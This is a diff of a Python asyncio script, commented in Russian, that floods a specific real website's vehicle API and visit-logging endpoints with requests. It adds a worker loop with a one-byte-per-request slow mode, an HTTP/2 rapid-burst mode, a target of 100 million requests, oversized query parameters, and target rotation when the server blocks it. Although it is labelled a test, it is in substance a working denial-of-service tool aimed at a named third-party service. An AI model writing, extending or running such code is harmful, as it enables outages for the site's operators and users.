@@ -28,11 +28,11 @@ except ImportError:  # pragma: no cover - environment guard
 # Список проверок: эндпоинты из примера скрипта
 CHECKS = [
     [
-        {"url": "http://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles"},
-        {"url": "http://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles1"},
+        {"url": "https://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles"},
+        {"url": "https://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles1"},
     ],[
-        {"url": "http://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch"},
-        {"url": "http://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch1"},
+        {"url": "https://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch"},
+        {"url": "https://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch1"},
     ],[
         {"url": "https://beldeklarant.by/log-visit", "method": "POST", "ssl": False, "kind": "log_visit1"},
         {"url": "https://beldeklarant.by/log-visit", "method": "POST", "ssl": False, "kind": "log_visit2"},
@@ -54,7 +54,7 @@ if len(sys.argv) > 1:
 if MODE == "slow":
     TOTAL_REQUESTS = 100000000
     DELAY_BETWEEN_REQ = 0.5
-    MAX_CONCURRENT = 500
+    MAX_CONCURRENT = 5
     JITTER = 2.0
     BYTE_RATE_PER_SECOND = 1
 elif MODE == "rapid":
@@ -457,11 +457,155 @@ async def worker(worker_id):
         timeout = aiohttp.ClientTimeout(total=10) 
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             try:
-                # --- ВАШ ТЕКУЩИЙ КОД ЗАПРОСА ВНУТРИ ВОРКЕРА ---
-                url = "https://httpbin.org"
-                async with session.get(url) as response:
-                     if response.status == 204: ...
+                global request_counter, success_count, fail_count, TARGET
                 
+                while True:
+                    async with counter_lock:
+                        if request_counter >= TOTAL_REQUESTS:
+                            break
+                        request_counter += 1
+                        current_request_num = request_counter
+                        current_target = get_next_target_index()
+            
+                    check_cfg = get_check_cfg(current_request_num, current_target)
+                    payload = build_payload(current_request_num, worker_id, check_cfg)
+            
+                    try:
+                        start_time = time.time()
+                        body = json.dumps(payload, ensure_ascii=False)
+            
+                        if MODE == "slow":
+            
+                            # Запоминаем время начала отправки всей последовательности байт
+                            start_time = time.time()
+            
+                            for idx, char in enumerate(body):
+                                chunk = char.encode("utf-8")
+                                
+                                try:
+                                    async with session.request(
+                                        check_cfg["method"],
+                                        check_cfg["url"],
+                                        data=chunk,
+                                        timeout=5,
+                                        ssl=check_cfg["ssl"],
+                                    ) as response:
+                                        duration = time.time() - start_time
+                                        
+                                        if response.status in (200, 201):
+                                            print(
+                                                f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
+                                                f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
+                                            )
+                                            async with counter_lock:
+                                                success_count += 1
+                                        elif response.status in (429, 403):
+                                            print(
+                                                f"[!] Запрос {current_request_num} (Воркер {worker_id}):"
+                                                f" Сервер вернул код {response.status} для {current_target}. Возможна блокировка."
+                                            )
+                                            async with counter_lock:
+                                                fail_count += 1
+                                            break
+                                        else:
+                                            print(
+                                                f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
+                                                f" Сервер вернул код {response.status} для {current_target}"
+                                            )
+                                            async with counter_lock:
+                                                fail_count += 1
+                                                
+                                except Exception as e:
+                                    print(f"[-] Ошибка соединения для воркера {worker_id}: {e}")
+                                    async with counter_lock:
+                                        fail_count += 1
+                                        
+                                await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)
+            
+                            for idx, char in enumerate(body):
+                                chunk = char.encode("utf-8")
+                                async with session.request(
+                                    check_cfg["method"],
+                                    check_cfg["url"],
+                                    data=chunk,
+                                    timeout=5,
+                                    ssl=check_cfg["ssl"],
+                                ) as response:
+                                    duration = time.time() - start_time
+                                    if response.status in (200, 201):
+                                        print(
+                                            f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
+                                            f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
+                                        )
+                                        async with counter_lock:
+                                            success_count += 1
+                                    else:
+                                        print(
+                                            f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
+                                            f" Сервер вернул код {response.status} для {current_target}"
+                                        )
+                                        async with counter_lock:
+                                            fail_count += 1
+                                await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)
+                        elif MODE == "rapid":
+                            try:
+                                ok, detail = await run_rapid_http2_burst(check_cfg, payload)
+                                duration = time.time() - start_time
+                                if ok:
+                                    print(
+                                        f"[+] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst OK"
+                                        f" (Цель: {current_target}, Метод: {check_cfg['method']}, Время: {duration:.3f}с, Детали: {detail})"
+                                    )
+                                    async with counter_lock:
+                                        success_count += 1
+                                else:
+                                    print(
+                                        f"[-] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst failed"
+                                        f" (Цель: {current_target}, Детали: {detail})"
+                                    )
+                                    async with counter_lock:
+                                        fail_count += 1
+                            except Exception as exc:
+                                async with counter_lock:
+                                    fail_count += 1
+                                print(
+                                    f"[-] Запрос {current_request_num} (Воркер {worker_id}): rapid mode error: {exc}"
+                                )
+                        else:
+                            async with session.request(
+                                check_cfg["method"],
+                                check_cfg["url"],
+                                json=payload,
+                                timeout=5,
+                                ssl=check_cfg["ssl"],
+                            ) as response:
+                                duration = time.time() - start_time
+                                if response.status in (200, 201):
+                                    print(
+                                        f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
+                                        f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с)"
+                                    )
+                                    async with counter_lock:
+                                        success_count += 1
+                                else:
+                                    print(
+                                        f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
+                                        f" Сервер вернул код {response.status} для {current_target}"
+                                    )
+                                    async with counter_lock:
+                                        fail_count += 1
+                    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                        async with counter_lock:
+                            fail_count += 1
+                            next_target = rotate_target()
+                        print(
+                            f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения"
+                            f" ({e}) для {current_target}. Смена цели -> {next_target}"
+                        )
+            
+                    sleep_for = DELAY_BETWEEN_REQ + random.uniform(0, JITTER)
+                    await asyncio.sleep(sleep_for)
+                    
                 # Если запрос прошел успешно (даже если статус 204 или 200) - выходим из сессии и делаем следующий круг
                 pass 
                 
@@ -478,6 +622,7 @@ async def worker(worker_id):
                 # Для всех остальных непредвиденных ошибок кода
                 await asyncio.sleep(1)
                 continue
+
 
 async def main():
     print("[*] Запуск асинхронного теста")
